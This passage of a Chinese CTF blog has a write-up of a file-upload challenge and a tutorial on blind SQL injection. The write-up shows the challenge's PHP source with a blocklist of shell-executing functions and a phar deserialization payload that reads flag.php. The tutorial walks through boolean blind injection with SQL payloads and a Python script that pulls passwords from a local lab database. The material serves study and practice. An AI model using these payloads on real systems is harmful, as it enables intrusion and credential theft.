class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span> = <span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span> = <span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span> = <span class="string">&quot;css/style.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span> = <span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>上传图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">&quot;text/javascript&quot;</span> <span class="attr">color</span> = <span class="string">&quot;0,0,255&quot;</span> <span class="attr">opacity</span> = <span class="string">&#x27;0.7&#x27;</span> <span class="attr">zIndex</span> = <span class="string">&quot;-2&quot;</span> <span class="attr">count</span> = <span class="string">&quot;99&quot;</span> <span class="attr">src</span> = <span class="string">&#x27;js/canvas-nest.min.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 动态背景 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span>&gt;</span>上传你手里最好的图片!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span> = <span class="string">&quot;comment&quot;</span>&gt;</span>If it is excellent enough, you will get the flag!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">&quot;form1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span> = <span class="string">&quot;post&quot;</span> <span class="attr">accept-charset</span> = <span class="string">&quot;utf-8&quot;</span> <span class="attr">enctype</span> = <span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span> <span class="attr">name</span> = <span class="string">&quot;title&quot;</span> <span class="attr">for</span> = <span class="string">&quot;file&quot;</span>&gt;</span>图片:   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;file&quot;</span> <span class="attr">name</span> = <span class="string">&quot;file&quot;</span> <span class="attr">id</span> = <span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">class</span> = <span class="string">&quot;button&quot;</span> <span class="attr">name</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">value</span> = <span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">	error_reporting(0);</span></span><br><span class="line"><span class="meta">	$dir = &#x27;upload/&#x27;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&#x27;/&#x27;;</span></span><br><span class="line"><span class="meta">	if(!is_dir($dir)) &#123;</span></span><br><span class="line"><span class="meta">		if(!mkdir($dir, 0777, true)) &#123;</span></span><br><span class="line"><span class="meta">			echo error_get_last()[&#x27;message&#x27;];</span></span><br><span class="line"><span class="meta">			die(&#x27;Failed to make the directory&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">	&#125;</span></span><br><span class="line"><span class="meta">	chdir($dir);</span></span><br><span class="line"><span class="meta">	if(isset($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">		$name = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span></span><br><span class="line"><span class="meta">		$tmp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span></span><br><span class="line"><span class="meta">		$ans = exif_imagetype($tmp_name);</span></span><br><span class="line"><span class="meta">		if($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt;= 204800) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;filesize too big.&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(!$name) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;filename can not be empty!&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(htaccess)|(user)|(\.\.)|(00)|(#)/i&#x27;, $name) !== 0) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;Hacker!&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span></span><br><span class="line"><span class="meta">			$type = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;];</span></span><br><span class="line"><span class="meta">			if($type == &#x27;image/gif&#x27; or $type == &#x27;image/jpg&#x27; or $type == &#x27;image/png&#x27; or $type == &#x27;image/jpeg&#x27;) &#123;</span></span><br><span class="line"><span class="meta">				echo &quot;&lt;p align=\&quot;center\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">			&#125;</span></span><br><span class="line"><span class="meta">			echo(&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;);</span></span><br><span class="line"><span class="meta">			exit;</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		$content = file_get_contents($tmp_name);</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;, $content) !== 0) &#123;</span></span><br><span class="line"><span class="meta">			echo(&#x27;&lt;script&gt;alert(&quot;How dare you upload file with such dangerous function?&quot;)&lt;/script&gt;&#x27;);</span></span><br><span class="line"><span class="meta">			exit;</span></span><br><span class="line"><span class="meta">		&#125;		</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		$extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;, $extension) === 0) &#123;</span></span><br><span class="line"><span class="meta">			die(&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;);</span></span><br><span class="line"><span class="meta">		&#125; </span></span><br><span class="line"><span class="meta">		$upload_file = $name;</span></span><br><span class="line"><span class="meta">		move_uploaded_file($tmp_name, $upload_file);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		if(file_exists($name)) &#123;</span></span><br><span class="line"><span class="meta">			echo &quot;&lt;p align=\&quot;center\&quot;&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">		&#125; else &#123;</span></span><br><span class="line"><span class="meta">			echo &#x27;&lt;script&gt;alert(&quot;上传失败&quot;)&lt;/script&gt;&#x27;;</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		echo &quot;&lt;p align=\&quot;center\&quot;&gt;&lt;a href=\&quot;view.php\&quot; &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">		#header(&quot;refresh:3;url=index.php&quot;);</span></span><br><span class="line"><span class="meta">	&#125;</span></span><br><span class="line"><span class="meta"> ?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);  </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();  </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后本地运行得到phar.phar</p>
<p>然后post方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete=phar://aaa.phar</span><br></pre></td></tr></table></figure>

<p>触发file_exists</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HSCSEC/" rel="tag">HSCSEC</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-盲注"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E7%9B%B2%E6%B3%A8/"
    >盲注</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E7%9B%B2%E6%B3%A8/" class="article-date">
  <time datetime="2023-02-02T08:55:52.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="1-布尔盲注的判断"><a href="#1-布尔盲注的判断" class="headerlink" title="1.布尔盲注的判断"></a>1.布尔盲注的判断</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">布尔状态例如：</span><br><span class="line">1.回显不同（内容、长度）</span><br><span class="line">2.HTTP响应状态码不同（200、500）</span><br><span class="line">3.HTTP响应头变化（无条件重定向、设置cookie）</span><br><span class="line">4.基于错误的布尔注入（MySQL是否报错）</span><br></pre></td></tr></table></figure>

<p>有些时候很多东西都被过滤了，如果一个一个的尝试的话会非常麻烦并且费时费力，可以尝试FUZZ黑名单过滤，利用burpsuite   intruder模块</p>
<p>先传入一个参数然后抓包，加一个变量利用intruder模块爆破sql语句关键字就可以了</p>
<h4 id="2-布尔盲注攻击流程"><a href="#2-布尔盲注攻击流程" class="headerlink" title="2.布尔盲注攻击流程"></a>2.布尔盲注攻击流程</h4><h5 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一步：正常查询，返回True（语句执行成功）或者返回False（语句执行成功没有查询到内容）。</span><br><span class="line">第二步：输入引号进行看页面变化，页面返回False，可能存在漏洞，也可能没有查询到内容。</span><br><span class="line">第三步：利用and进行判断，比如：1 and 1=1和1 and 1=2，1’ and 1=1#和1’ and 1=2#，如果前者执</span><br><span class="line">行的结果不一样，说明是数字型的布尔盲注；如果后者执行的结果不一样，说明是字符型的布尔盲注。</span><br></pre></td></tr></table></figure>



<h5 id="2-获取数据库长度"><a href="#2-获取数据库长度" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内</span><br><span class="line">置函数获取字符串长度：</span><br><span class="line">length() ：单位是字节，utf8编码下,一个汉字三个字节，一个数字或字母一个字节。gbk编码下,一</span><br><span class="line">个汉字两个字节，一个数字或字母一个字节。</span><br><span class="line"><span class="keyword">char_length</span>()：单位为字符，不管汉字还是数字或者是字母都算是一个字符。</span><br><span class="line">比如：</span><br><span class="line"><span class="keyword">select</span> length(database()); </span><br><span class="line"><span class="keyword">select</span> length(database())<span class="operator">=</span><span class="number">8</span>;   #利用这种方式赋值  当赋值正确时会返回正确也可以通过脚本来爆破</span><br></pre></td></tr></table></figure>



<h5 id="3-逐字猜解数据库名"><a href="#3-逐字猜解数据库名" class="headerlink" title="3.逐字猜解数据库名"></a>3.逐字猜解数据库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在获取数据库名的时候注意数据库的命名规则，他是采用26个英文字母(区分大小写)和0-9的自然数(经常</span><br><span class="line">不需要)加上下划线&#x27;_&#x27;组成，命名简洁明确，多个单词用下划线&#x27;_&#x27;分隔。</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用substr字符串截取函数来逐个判断</span><br><span class="line">substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span></span><br><span class="line">如果substr函数被过滤可以使用  mid()函数来替代</span><br><span class="line">也可以把截取的东西转化为ASCII值来判断</span><br><span class="line">ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span></span><br><span class="line">爆破过程可以利用burpsuite   intruder  模块进行爆破</span><br><span class="line">过滤了逗号怎么办？就不能多个参数了吗？利用   <span class="keyword">from</span>   和    <span class="keyword">for</span>  代替</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span>,<span class="number">6</span>,<span class="number">5</span>);与<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span> <span class="keyword">FROM</span> <span class="number">6</span> <span class="keyword">FOR</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h5 id="4-逐字猜解数据库的表名"><a href="#4-逐字猜解数据库的表名" class="headerlink" title="4.逐字猜解数据库的表名"></a>4.逐字猜解数据库的表名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>



<h5 id="5-逐字猜解字段名"><a href="#5-逐字猜解字段名" class="headerlink" title="5.逐字猜解字段名"></a>5.逐字猜解字段名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>



<h5 id="6-逐字猜解记录数据"><a href="#6-逐字猜解记录数据" class="headerlink" title="6.逐字猜解记录数据"></a>6.逐字猜解记录数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 表名))</span><br></pre></td></tr></table></figure>



<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#还可以采用python脚本的形式来进行爆破</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli/Less-5/&#x27;</span></span><br><span class="line"><span class="comment"># select = &#x27;select database()&#x27;     #数据库  security</span></span><br><span class="line"><span class="comment"># select = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;    #表名  emails,referers,uagents,users</span></span><br><span class="line"><span class="comment"># select  = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;&quot;   #字段名  user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(password) from users&quot;</span>     <span class="comment">#字段内容</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">126</span>):</span><br><span class="line">        payload = <span class="string">f&quot;-1&#x27; or ord(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;?id=&#x27;</span>+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">125</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-布尔盲注的一些函数"><a href="#3-布尔盲注的一些函数" class="headerlink" title="3.布尔盲注的一些函数"></a>3.布尔盲注的一些函数</h4><h5 id="1-substr-函数"><a href="#1-substr-函数" class="headerlink" title="1.substr()函数"></a>1.substr()函数</h5><p>substr(str,pos,len)   表示截取字符串str  从pos这位置截取len个字符</p>
<p>如果过滤了逗号</p>
<p>SELECT SUBSTR(‘2018-08-17’ FROM 6 FOR 5);</p>
<h5 id="2-mid"><a href="#2-mid" class="headerlink" title="2.mid()"></a>2.mid()</h5><p>mid(str,pos,len)    表示截取字符串str  从pos这位置截取len个字符  用法与substr类似</p>
<h5 id="3-right-函数"><a href="#3-right-函数" class="headerlink" title="3.right()函数"></a>3.right()函数</h5><p>right(str,len)    表示从字符串的最右面截取len个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">技巧是结合ascii()</span><br><span class="line">ascii(‘str’) 返回字符串的第一个字符的ascii码 能用ascii时尽量用ascii! 因为字符的比较可能因为字符比较特殊(比如是单引号)而出现很多问题，但是ascii</span><br><span class="line">直接转成数字，就解决了这个问题！</span><br><span class="line">ascii的同名函数是ord 用于过滤ascii的过滤</span><br></pre></td></tr></table></figure>

<h5 id="4-trim-函数"><a href="#4-trim-函数" class="headerlink" title="4.trim()函数"></a>4.trim()函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL trim() 函数 过滤指定的字符串,最常见的用途是移除字首或字尾的空白。</span><br><span class="line">MySQL: TRIM( ), RTRIM( ), LTRIM( )</span><br><span class="line">TRIM() #删除前后空格</span><br><span class="line">RTRIM() #删除字符串结尾空格</span><br><span class="line">LTRIM() #删除字符串起始空格</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）</span><br><span class="line">如果=用regexp替代 那么正确的字符一定在regexp前面 以这个abcd为例</span><br><span class="line">Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)</span><br><span class="line">就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1</span><br></pre></td></tr></table></figure>

<h5 id="5-insert"><a href="#5-insert" class="headerlink" title="5.insert()"></a>5.insert()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Insert(字符串，起始位置，长度，替换为什么)</span><br><span class="line">abc从第一位也就是a开始后的两位(ab)替换为xx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662302958057.png" alt="1662302958057"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">insert</span>((<span class="keyword">insert</span>(<span class="string">&#x27;abcdef&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)),<span class="number">2</span>,<span class="number">99999</span>,<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303054792.png" alt="1662303054792"></p>
<h5 id="6-比较字符串"><a href="#6-比较字符串" class="headerlink" title="6.比较字符串"></a>6.比较字符串</h5><p>当字符串比较时是按位比较的</p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303178229.png" alt="1662303178229"></p>
<h5 id="7-like"><a href="#7-like" class="headerlink" title="7.like"></a>7.like</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我 们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。</span><br><span class="line">WHERE 子句中可以使用等号 = 来设定获取数据的条件，如 &quot;runoob_</span><br><span class="line">author = &#x27;RUNOOB.COM&#x27;&quot;。 但是有时候我们需要获取 runoob_author 字段含有 &quot;COM&quot; 字符的所 有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</span><br><span class="line">SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或 正则表达式中的星号 *。 如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303301148.png" alt="1662303301148"></p>
<h5 id="8-正则表达式-regexp-rlike"><a href="#8-正则表达式-regexp-rlike" class="headerlink" title="8.正则表达式 regexp rlike"></a>8.正则表达式 regexp rlike</h5><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303405311.png" alt="1662303405311"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp是不区分大小写的，需要大小写敏感 需要加上binary关键字</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303431365.png" alt="1662303431365"></p>
<h5 id="9-between"><a href="#9-between" class="headerlink" title="9.between"></a>9.between</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">expr [NOT] BETWEEN begin_expr AND end_expr;</span><br><span class="line">between筛选的是 expr &gt;= begin_expr并且 expr &lt;= end_expr 的数据，如果不存 在则返回的是0；</span><br><span class="line">not between筛选的是 expr &lt; begin_expr或者 expr &gt; end_expr 的数据，如果不 存在则返回的是0； 如果 expr 返回的是 NULL，则between 也返回的是null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303596097.png" alt="1662303596097"></p>
<h5 id="10-in"><a href="#10-in" class="headerlink" title="10.in"></a>10.in</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依然是大小写不敏感的 字符数字都可用 也有not in</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303642507.png" alt="1662303642507"></p>
<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><h4 id="1-延时盲注的介绍"><a href="#1-延时盲注的介绍" class="headerlink" title="1.延时盲注的介绍"></a>1.延时盲注的介绍</h4><p>在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这 种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。既无论用户输入什么页面都是下面这种</p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230641480.png" alt="image-20221210230641480"></p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230656871.png" alt="image-20221210230656871"></p>
